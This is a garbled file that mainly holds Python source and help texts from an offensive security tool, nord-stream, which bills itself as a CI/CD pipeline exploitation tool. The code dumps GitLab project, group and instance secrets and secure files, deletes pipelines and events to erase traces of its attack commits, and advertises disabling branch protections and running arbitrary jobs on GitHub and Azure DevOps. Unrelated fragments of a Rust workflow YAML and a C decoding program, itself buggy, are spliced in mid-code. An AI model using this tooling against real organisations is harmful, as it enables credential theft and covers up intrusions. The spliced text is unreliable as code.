                cookies["_gitlab_session"] = token
            else:
                headers["PRIVATE-TOKEN"] = token

            return (
                requests.get(
                    f"{gitlabURL.strip('/')}/api/v4/user",
                    headers=headers,
                    cookies=cookies,
                    verify=verifyCert,
                ).status_code
                == 200
            )
        except Exception as e:
            logger.error(e)
        return False

    def __getLogin(self):
        response = self.getUser()
        return response.get("username", "")

    def getUser(self):
        logger.debug(f"Retrieving user informations")

        return self._session.get(f"{self._gitlabURL}/api/v4/user").json()

    def setCookiesAndHeaders(self):
        if isGitLabSessionCookie(self._token):
            self._session.cookies.update({"_gitlab_session": self._token})
        else:
            self._session.headers.update({"PRIVATE-TOKEN": self._token})

    def __paginatedGet(self, url, params={}):

        params["per_page"] = 100

        res = []

        i = 1
        while True:

            params["page"] = i

            response = self._session.get(url, params=params)

            if response.status_code == 200:
                if len(response.json()) == 0:
                    break
                res.extend(response.json())
                i += 1

            else:
                logger.debug(f"Error {response.status_code} while retrieving data: {url}")
                return response.status_code, response.json()

        return response.status_code, res

    def listVariablesFromProject(self, project):
        id = project.get("id")
        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{id}/variables")

        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir(project.get("path_with_namespace"))

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                res.append({"key": variable["key"], "value": variable["value"], "protected": variable["protected"]})

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listSecureFilesFromProject(self, project):
        logger.debug("Getting project secure files")
        id = project.get("id")

        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{id}/secure_files")
        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir(project.get("path_with_namespace"))
            date = time.strftime("%Y-%m-%d_%H-%M-%S")

            for secFile in response:

                date = time.strftime("%Y-%m-%d_%H-%M-%S")
                name = "".join(
                    [c for c in secFile.get("name") if c.isalpha() or c.isdigit() or c in (" ", ".", "-", "_")]
                ).strip()
                fileName = f"securefile_{date}_{name}"

                f = open(f"{path}/{fileName}", "wb")

                content = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{id}/secure_files/{secFile.get('id')}/download"
                )

                # handle large files
                for chunk in content.iter_content(chunk_size=8192):
                    f.write(chunk)
                f.close()

                res.append({"name": secFile.get("name"), "path": f"{path}/{fileName}"})

        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listVariablesFromGroup(self, group):
        id = group.get("id")
        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/groups/{id}/variables")

        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir(group.get("full_path"))

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                res.append({"key": variable["key"], "value": variable["value"], "protected": variable["protected"]})

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listVariablesFromInstance(self):
        res = []
        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/admin/ci/variables")

        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir("")

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                res.append({"key": variable["key"], "value": variable["value"], "protected": variable["protected"]})

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def addProject(self, project=None, filterWrite=False, strict=False):
        logger.debug(f"Checking project: {project}")

        params = {}

        if project != None:
            params["search_namespaces"] = True
            params["search"] = project

        if filterWrite:
            params["min_access_level"] = 30

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects", params)

        if status_code == 200:
            if len(response) == 0:
                return

            for p in response:
                if strict and p.get("path_with_namespace") != project:
                    continue
                p = {
                    "id": p.get("id"),
                    "path_with_namespace": p.get("path_with_namespace"),
                    "name": p.get("name"),
                    "path": p.get("path"),
                }
                self._projects.append(p)

        else:
            logger.error("Error while retrieving projects")
            logger.debug(response)

    def addGroups(self, group=None):
        logger.debug(f"Checking group: {group}")

        params = {"all_available": True}

        if group != None:
            params["search_namespaces"] = True
            params["search"] = group

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/groups", params)

        if status_code == 200:
            if len(response) == 0:
                return

            for p in response:
                p = {
                    "id": p.get("id"),
                    "full_path": p.get("full_path"),
                    "name": p.get("name"),
                }
                self._groups.append(p)

        else:
            logger.error("Error while retrieving groups")
            logger.debug(response)

    def __createOutputDir(self, name):
        # outputName = name.replace("/", "_")
        path = f"{self._outputDir}/{name}"
        makedirs(path, exist_ok=True)
        return path

    def waitPipeline(self, projectId):
        logger.info("Getting pipeline output")

        time.sleep(5)

        response = self._session.get(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}"
        ).json()

        if response[0].get("status") not in COMPLETED_STATES:
            for i in range(self._maxRetry):
                logger.warning(f"Pipeline still running, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

                response = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}"
                ).json()

                if response[0].get("status") in COMPLETED_STATES:
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Error: pipeline still not finished.")

        return (
            response[0].get("id"),
            response[0].get("status"),
        )

    def __getJobs(self, projectId, pipelineId):

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines/{pipelineId}/jobs"
        )

        if status_code == 403:
            raise GitLabError(response.get("message"))

        # reverse the list to get the first job at the first position
        return response[::-1]

    def downloadPipelineOutput(self, project, pipelineId):
        projectPath = project.get("path_with_namespace")
        self.__createOutputDir(projectPath)

        projectId = project.get("id")

        jobs = self.__getJobs(projectId, pipelineId)

        date = time.strftime("%Y-%m-%d_%H-%M-%S")
        f = open(f"{self._outputDir}/{projectPath}/pipeline_{date}.log", "w")

        if len(jobs) == 0:
            return None

        for job in jobs:

            jobId = job.get("id")
            jobName = job.get("name", "")
            jobStage = job.get("stage", "")
            jobStatus = job.get("status", "")

            output = self.__getTraceForJobId(projectId, jobId)

            if jobStatus != "skipped":
                f.write(f"[+] {jobName} (stage={jobStage})\n")
                f.write(output)

        f.close()

        return f"pipeline_{date}.log"

    def __getTraceForJobId(self, projectId, jobId):

        response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/jobs/{jobId}/trace")

        if response.status_code != 200:
            for i in range(self._maxRetry):
                logger.warning(f"Output not ready, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)
                response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/jobs/{jobId}/trace")
                if response.status_code == 200:
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Output still no ready, error !")
                    return None

        return response.text

    def __deletePipeline(self, projectId):
        logger.debug("Deleting pipeline")

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}"
        )

        for pipeline in response:

            # additional checks for non default branches
            # we don't want to remove legitimate logs
            if self._branchName != self._DEFAULT_BRANCH_NAME:
                commitId = pipeline.get("sha")

                response = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{projectId}/repository/commits/{commitId}"
                ).json()

                if response.get("title") != (Git.ATTACK_COMMIT_MSG and Git.CLEAN_COMMIT_MSG):
                    continue

                if response.get("author_name") != Git.USER:
                    continue

            pipelineId = pipeline.get("id")
            response = self._session.delete(f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines/{pipelineId}")

    def cleanAllLogs(self, projectId):
        # deleting the pipeline removes everything
        self.__deletePipeline(projectId)

    # not working
    def __cleanEvents(self, projectId):
        logger.debug(f"Deleting events for project: {projectId}")

        i = 1
        while True:

            params = {"per_page": 100, "page": i}

            response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/events", params=params)

            if response.status_code == 200:
                if len(response.json()) == 0:
                    break

                for event in response.json():
                    eventId = event.get("id")
                    # don't work
                    response = self._session.delete(f"{self._gitlabURL}/api/v4/projects/{projectId}/events/{eventId}")

                i += 1
            else:
                logger.error("Error while retrieving event")
                logger.debug(response.json())

    def getBranchesProtectionRules(self, projectId):
        logger.debug("Getting branch protection rules")

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{projectId}/protected_branches")

        if status_code == 403:
            raise GitLabError(response.get("message"))

        return response

    def getBranches(self, projectId):
        logger.debug("Getting branch protection rules (limited)")

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/repository/branches"
        )

        if status_code == 403:
            raise GitLabError(response.get("message"))

        # sometimes GitLab return a 404 and not an empty array
        if status_code == 404:
            project = self.getProject(projectId)

            # if the repo is empty raise an error since there is no branch
            if project.get("empty_repo"):
                raise GitLabError("The project is empty and has no branches.")
            else:
                raise GitLabError("Got 404 for unknown reason.")

        return response

    def getProject(self, projectId):
        logger.debug("Getting project: {projectId}")

        response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}")

        if response.status_code != 200:
            raise GitLabError(response.json().get("message"))
        else:
            return response.json()

    def getFailureReasonPipeline(self, projectId, pipelineId):

        response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines/{pipelineId}").json()

        return response.get("yaml_errors", None)

    def getFailureReasonJobs(self, projectId, pipelineId):

        res = []
        jobs = self.__getJobs(projectId, pipelineId)

        for job in jobs:

            failure = {}
            failure["name"] = job.get("name", "")
            failure["stage"] = job.get("stage", "")
            failure["failure_reason"] = job.get("failure_reason", "")

            if failure["failure_reason"] != "":
                res.append(failure)

        return res
    branches: [ "main" ]

env: """
CICD pipeline exploitation tool

Usage:
    nord-stream.py devops [options] --token <pat> --org <org> [--project <project> --no-vg --no-gh --no-az --no-aws --write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
    nord-stream.py devops [options] --token <pat> --org <org> --yaml <yaml> --project <project> [--write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
    nord-stream.py devops [options] --token <pat> --org <org> --build-yaml <output> [--build-type <type>]
    nord-stream.py devops [options] --token <pat> --org <org> --clean-logs [--project <project>]
    nord-stream.py devops [options] --token <pat> --org <org> --list-projects [--write-filter]
    nord-stream.py devops [options] --token <pat> --org <org> --list-secrets [--project <project> --write-filter]
    nord-stream.py devops [options] --token <pat> --org <org> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs

Commit:
    --user <user>                           User used to commit
    --email <email>                         Email address used commit
    --key-id <id>                           GPG primary key ID to sign commits

args:
    --token <pat>                           Azure DevOps personal token
    --org <org>                             Org name
    -p, --project <project>                 Run on selected project (can be a file)
    -y, --yaml <yaml>                       Run arbitrary job
    --clean-logs                            Delete all pipeline created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean pipeline logs (default false)
    --no-vg                                 Don't extract variable groups secrets
    --no-sf                                 Don't extract secure files
    --no-gh                                 Don't extract GitHub service connection secrets
    --no-az                                 Don't extract Azure service connection secrets
    --no-aws                                Don't extract AWS service connection secrets
    --list-projects                         List all projects.
    --list-secrets                          List all secrets.
    --write-filter                          Filter projects where current user has write or admin access.
    --build-yaml <output>                   Create a pipeline yaml file with default configuration.
    --build-type <type>                     Type used to generate the yaml file can be: default, azurerm, github, aws
    --describe-token                        Display information on the token
    --branch-name <name>                    Use specific branch name for deployment.
    --pipeline-name <name>                  Use pipeline for deployment.
    --repo-name <name>                      Use specific repo for deployment.

Examples:
    List all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg --list-secrets

    Dump all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg

Authors: @hugow @0hexit
"""

from docopt import docopt
from nordstream.cicd.devops import DevOps
from nordstream.core.devops.devops import DevOpsRunner
from nordstream.utils.log import logger, NordStreamLog
from nordstream.git import Git


def start(argv):
    args = docopt(__doc__, argv=argv)

    if args["--verbose"]:
        NordStreamLog.setVerbosity(verbose=1)

    if args["--debug"]:
        NordStreamLog.setVerbosity(verbose=2)

    logger.debug(args)
    # check validity of the token
    if not DevOps.checkToken(args["--token"], args["--org"]):
        logger.critical("Invalid token or org.")

    # devops setup
    devops = DevOps(args["--token"], args["--org"])
    if args["--output-dir"]:
        devops.outputDir = args["--output-dir"] + "/"
    if args["--branch-name"]:
        devops.branchName = args["--branch-name"]
    if args["--pipeline-name"]:
        devops.pipelineName = args["--pipeline-name"]
    if args["--repo-name"]:
        devops.repoName = args["--repo-name"]

    devopsRunner = DevOpsRunner(devops)

    if args["--key-id"]:
        Git.KEY_ID = args["--key-id"]
    if args["--user"]:
        Git.USER = args["--user"]
    if args["--email"]:
        Git.EMAIL = args["--email"]

    if args["--yaml"]:
        devopsRunner.yaml = args["--yaml"]
    if args["--write-filter"]:
        devopsRunner.writeAccessFilter = args["--write-filter"]

    if args["--no-vg"]:
        devopsRunner.extractVariableGroups = not args["--no-vg"]
    if args["--no-sf"]:
        devopsRunner.extractSecureFiles = not args["--no-sf"]
    if args["--no-az"]:
        devopsRunner.extractAzureServiceconnections = not args["--no-az"]
    if args["--no-gh"]:
        devopsRunner.extractGitHubServiceconnections = not args["--no-gh"]
    if args["--no-aws"]:
        devopsRunner.extractAWSServiceconnections = not args["--no-aws"]
    if args["--no-clean"]:
        devopsRunner.cleanLogs = not args["--no-clean"]

    if args["--describe-token"]:
        devopsRunner.describeToken()
        return

    devopsRunner.getProjects(args["--project"])

    # logic
    if args["--list-projects"]:
        devopsRunner.listDevOpsProjects()

    elif args["--list-secrets"]:
        devopsRunner.listProjectSecrets()

    elif args["--clean-logs"]:
        devopsRunner.manualCleanLogs()

    elif args["--build-yaml"]:
        devopsRunner.output = args["--build-yaml"]
        devopsRunner.createYaml(args["--build-type"])

    else:
        devopsRunner.runPipeline()
  CARGO_TERM_COLOR: """
CICD pipeline exploitation tool

Usage:
    nord-stream.py github [options] --token <ghp> --org <org> [--repo <repo> --no-repo --no-env --no-org --env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> --yaml <yaml> --repo <repo> [--env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> ([--clean-logs] [--clean-branch-policy]) [--repo <repo> --branch-name <name>]
    nord-stream.py github [options] --token <ghp> --org <org> --build-yaml <filename> --repo <repo> [--build-type <type> --env <env>]
    nord-stream.py github [options] --token <ghp> --org <org> --azure-tenant-id <tenant> --azure-client-id <client> [--repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> --aws-role <role> --aws-region <region> [--repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> --list-protections [--repo <repo> --branch-name <name> --disable-protections]
    nord-stream.py github [options] --token <ghp> --org <org> --list-secrets [--repo <repo> --no-repo --no-env --no-org]
    nord-stream.py github [options] --token <ghp> [--org <org>] --list-repos [--write-filter]
    nord-stream.py github [options] --token <ghp> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs

Commit:
    --user <user>                           User used to commit
    --email <email>                         Email address used commit
    --key-id <id>                           GPG primary key ID to sign commits

args:
    --token <ghp>                           Github personal token
    --org <org>                             Org name
    -r, --repo <repo>                       Run on selected repo (can be a file)
    -y, --yaml <yaml>                       Run arbitrary job
    --clean-logs                            Delete all logs created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean workflow logs (default false)
    --clean-branch-policy                   Remove branch policy, can be used with --repo. This operation is done by default but can be manually triggered.
    --build-yaml <filename>                 Create a pipeline yaml file with all secrets.
    --build-type <type>                     Type used to generate the yaml file can be: default, azureoidc, awsoidc
    --env <env>                             Specify env for the yaml file creation.
    --no-repo                               Don't extract repo secrets.
    --no-env                                Don't extract environnments secrets.
    --no-org                                Don't extract organization secrets.
    --azure-tenant-id <tenant>              Identifier of the Azure tenant associated with the application having federated credentials (OIDC related).
    --azure-subscription-id <subscription>  Identifier of the Azure subscription associated with the application having federated credentials (OIDC related).
    --azure-client-id <client>              Identifier of the Azure application (client) associated with the application having federated credentials (OIDC related).
    --aws-role <role>                       AWS role to assume (OIDC related).
    --aws-region <region>                   AWS region (OIDC related).
    --list-protections                      List all protections.
    --list-repos                            List all repos.
    --list-secrets                          List all secrets.
    --disable-protections                   Disable the branch protection rules (needs admin rights)
    --write-filter                          Filter repo where current user has write or admin access.
    --force                                 Don't check environment and branch protections.
    --branch-name <name>                    Use specific branch name for deployment.
    --describe-token                        Display information on the token

Examples:
    List all secrets from all repositories
    $ nord-stream.py github --token "$GHP" --org myorg --list-secrets

    Dump all secrets from all repositories and try to disable branch protections
    $ nord-stream.py github --token "$GHP" --org myorg --disable-protections

Authors: @hugow @0hexit
"""

from docopt import docopt
from nordstream.cicd.github import GitHub
from nordstream.core.github.github import GitHubWorkflowRunner
from nordstream.utils.log import logger, NordStreamLog
from nordstream.git import Git


def start(argv):
    args = docopt(__doc__, argv=argv)

    if args["--verbose"]:
        NordStreamLog.setVerbosity(verbose=1)
    if args["--debug"]:
        NordStreamLog.setVerbosity(verbose=2)

    logger.debug(args)

    # check validity of the token
    if not GitHub.checkToken(args["--token"]):
        logger.critical("Invalid token.")

    # github setup
    gitHub = GitHub(args["--token"])
    if args["--output-dir"]:
        gitHub.outputDir = args["--output-dir"] + "/"
    if args["--org"]:
        gitHub.org = args["--org"]
    if args["--branch-name"]:
        gitHub.branchName = args["--branch-name"]
        logger.info(f'Using branch: "{gitHub.branchName}"')

    if args["--key-id"]:
        Git.KEY_ID = args["--key-id"]
    if args["--user"]:
        Git.USER = args["--user"]
    if args["--email"]:
        Git.EMAIL = args["--email"]

    # runner setup
    gitHubWorkflowRunner = GitHubWorkflowRunner(gitHub, args["--env"])

    if args["--no-repo"]:
        gitHubWorkflowRunner.extractRepo = not args["--no-repo"]
    if args["--no-env"]:
        gitHubWorkflowRunner.extractEnv = not args["--no-env"]
    if args["--no-org"]:
        gitHubWorkflowRunner.extractOrg = not args["--no-org"]
    if args["--yaml"]:
        gitHubWorkflowRunner.yaml = args["--yaml"]
    if args["--disable-protections"]:
        gitHubWorkflowRunner.disableProtections = args["--disable-protections"]
    if args["--write-filter"]:
        gitHubWorkflowRunner.writeAccessFilter = args["--write-filter"]
    if args["--force"]:
        gitHubWorkflowRunner.forceDeploy = args["--force"]
    if args["--aws-role"] or args["--azure-tenant-id"]:
        gitHubWorkflowRunner.exploitOIDC = True
    if args["--azure-tenant-id"]:
        gitHubWorkflowRunner.tenantId = args["--azure-tenant-id"]
    if args["--azure-subscription-id"]:
        gitHubWorkflowRunner.subscriptionId = args["--azure-subscription-id"]
    if args["--azure-client-id"]:
        gitHubWorkflowRunner.clientId = args["--azure-client-id"]
    if args["--aws-role"]:
        gitHubWorkflowRunner.role = args["--aws-role"]
    if args["--aws-region"]:
        gitHubWorkflowRunner.region = args["--aws-region"]
    if args["--no-clean"]:
        gitHubWorkflowRunner.cleanLogs = not args["--no-clean"]

    # logic
    if args["--describe-token"]:
        gitHubWorkflowRunner.describeToken()

    elif args["--list-repos"]:
        gitHubWorkflowRunner.getRepos(args["--repo"])
        gitHubWorkflowRunner.listGitHubRepos()

    elif args["--list-secrets"]:
        gitHubWorkflowRunner.getRepos(args["--repo"])
        gitHubWorkflowRunner.listGitHubSecrets()

    elif args["--build-yaml"]:
        gitHubWorkflowRunner.writeAccessFilter = True
        gitHubWorkflowRunner.workflowFilename = args["--build-yaml"]
        gitHubWorkflowRunner.createYaml(args["--repo"], args["--build-type"])

    # Cleaning
    elif args["--clean-logs"] or args["--clean-branch-policy"]:
        gitHubWorkflowRunner.getRepos(args["--repo"])
        if args["--clean-logs"]:
            gitHubWorkflowRunner.manualCleanLogs()
        if args["--clean-branch-policy"]:
            gitHubWorkflowRunner.manualCleanBranchPolicy()

    elif args["--list-protections"]:
        gitHubWorkflowRunner.writeAccessFilter = True
        gitHubWorkflowRunner.getRepos(args["--repo"])
        gitHubWorkflowRunner.checkBranchProtections()

    else:
        gitHubWorkflowRunner.writeAccessFilter = True
        gitHubWorkflowRunner.getRepos(args["--repo"])
        gitHubWorkflowRunner.start()

jobs: """
CICD pipeline exploitation tool

Usage:
    nord-stream.py gitlab [options] --token <pat> (--list-secrets | --list-protections) [--project <project> --group <group> --no-project --no-group --no-instance --write-filter]
    nord-stream.py gitlab [options] --token <pat> ( --list-groups | --list-projects ) [--project <project> --group <group> --write-filter]
    nord-stream.py gitlab [options] --token <pat> --yaml <yaml> --project <project> [--no-clean]
    nord-stream.py gitlab [options] --token <pat> --clean-logs [--project <project>]
    nord-stream.py gitlab [options] --token <pat> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs
    --url <gitlab_url>                      Gitlab URL [default: https://gitlab.com]
    --ignore-cert                           Allow insecure server connections

Commit:
    --user <user>                           User used to commit
    --email <email>                         Email address used commit
    --key-id <id>                           GPG primary key ID to sign commits

args:
    --token <pat>                           GitLab personal access token or _gitlab_session cookie
    --project <project>                     Run on selected project (can be a file)
    --group <group>                         Run on selected group (can be a file)
    --list-secrets                          List all secrets.
    --list-protections                      List branch protection rules.
    --list-projects                         List all projects.
    --list-groups                           List all groups.
    --write-filter                          Filter repo where current user has developer access or more.
    --no-project                            Don't extract project secrets.
    --no-group                              Don't extract group secrets.
    --no-instance                           Don't extract instance secrets.
    -y, --yaml <yaml>                       Run arbitrary job
    --branch-name <name>                    Use specific branch name for deployment.
    --clean-logs                            Delete all pipeline logs created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean pipeline logs (default false)
    --describe-token                        Display information on the token

Examples:
    Dump all secrets
    $ nord-stream.py gitlab --token "$TOKEN" --url https://gitlab.local --list-secrets

    Deploy the custom pipeline on the master branch
    $ nord-stream.py gitlab --token "$TOKEN" --url https://gitlab.local --yaml exploit.yaml --branch master --project 'group/projectname'

Authors: @hugow @0hexit
"""

from docopt import docopt
from nordstream.cicd.gitlab import GitLab
from nordstream.core.gitlab.gitlab import GitLabRunner
from nordstream.utils.log import logger, NordStreamLog
from nordstream.git import Git


def start(argv):
    args = docopt(__doc__, argv=argv)

    if args["--verbose"]:
        NordStreamLog.setVerbosity(verbose=1)
    if args["--debug"]:
        NordStreamLog.setVerbosity(verbose=2)

    logger.debug(args)

    # check validity of the token
    if not GitLab.checkToken(args["--token"], args["--url"], (not args["--ignore-cert"])):
        logger.critical('Invalid token or the token doesn\'t have the "api" scope.')

    # gitlab setup
    gitlab = GitLab(args["--url"], args["--token"], (not args["--ignore-cert"]))
    if args["--output-dir"]:
        gitlab.outputDir = args["--output-dir"] + "/"
    gitLabRunner = GitLabRunner(gitlab)

    if args["--key-id"]:
        Git.KEY_ID = args["--key-id"]
    if args["--user"]:
        Git.USER = args["--user"]
    if args["--email"]:
        Git.EMAIL = args["--email"]

    if args["--branch-name"]:
        gitlab.branchName = args["--branch-name"]
        logger.info(f'Using branch: "{gitlab.branchName}"')

    # config
    if args["--write-filter"]:
        gitLabRunner.writeAccessFilter = args["--write-filter"]
    if args["--no-project"]:
        gitLabRunner.extractProject = not args["--no-project"]
    if args["--no-group"]:
        gitLabRunner.extractGroup = not args["--no-group"]
    if args["--no-instance"]:
        gitLabRunner.extractInstance = not args["--no-instance"]
    if args["--no-clean"]:
        gitLabRunner.cleanLogs = not args["--no-clean"]
    if args["--yaml"]:
        gitLabRunner.yaml = args["--yaml"]

    # logic
    if args["--describe-token"]:
        gitLabRunner.describeToken()

    elif args["--list-projects"]:
        gitLabRunner.getProjects(args["--project"])
        gitLabRunner.listGitLabProjects()

    elif args["--list-protections"]:
        gitLabRunner.getProjects(args["--project"])
        gitLabRunner.listBranchesProtectionRules()

    elif args["--list-groups"]:
        gitLabRunner.getGroups(args["--group"])
        gitLabRunner.listGitLabGroups()

    elif args["--list-secrets"]:
        if gitLabRunner.extractProject:
            gitLabRunner.getProjects(args["--project"])
        if gitLabRunner.extractGroup:
            gitLabRunner.getGroups(args["--group"])

        gitLabRunner.listGitLabSecrets()

    elif args["--clean-logs"]:
        gitLabRunner.getProjects(args["--project"])
        gitLabRunner.manualCleanLogs()

    else:
        gitLabRunner.getProjects(args["--project"], strict=True)
        gitLabRunner.runPipeline()
    build: 


/*
**        Description:        To decode the data, encoded using 3 character encoding technique.
*/





#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

void ThreeCharacterEncoding_Decode(uint8_t byte3, uint8_t byte2, uint8_t byte1, uint32_t *decodedOutput);

int main(void)
{
        uint32_t forDecodingDebug;
        uint8_t byte3, byte2, byte1;
        while(1)
        {
                printf("Input 3 bytes of data : \n");
                scanf("%u%u%u", &byte3, &byte2, &byte1);
                ThreeCharacterEncoding_Decode(byte3, byte2, byte1, &forDecodingDebug);
                printf("Decoded Value = %d\n", forDecodingDebug);
        }
}


/*
**        @brief                                                                                        Function to decode the 3 character encoding, to extract the encoded distance.
**        @byte3(PARAM_IN)                                                Higher encoded byte.
**        @byte2(PARAM_IN)                                                High encoded byte.
**        @byte1(PARAM_IN)                                                Low encoded byte.
**        @decodedOutput(PARAM_OUT)                Pointer to the variable which will contain the decoded output.
*/
void ThreeCharacterEncoding_Decode(uint8_t byte3, uint8_t byte2, uint8_t byte1, uint32_t *decodedOutput)
{
        uint8_t temp_byte1;
        uint8_t temp_byte2;
        uint8_t temp_byte3;

        /*        Decryption starts with subtracting 0x30 from each of the encoded bytes        */
        temp_byte3 = byte3 - 0x30;
        temp_byte2 = byte2 - 0x30;
        temp_byte1 = byte1 - 0x30;

        /*        Reset all bits of the output variable        */
        *decodedOutput &= ~(*decodedOutput);

        /*        Populate the output variable with decoded data        */
        *decodedOutput |= (temp_byte3 << 12);
        *decodedOutput |= (temp_byte2 << 6);
        *decodedOutput |= (temp_byte1 << 0);

        return;
} 

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v4
    - name: Build
      run: cargo build --verbose
    - name: Run tests
      run: cargo test --verbose
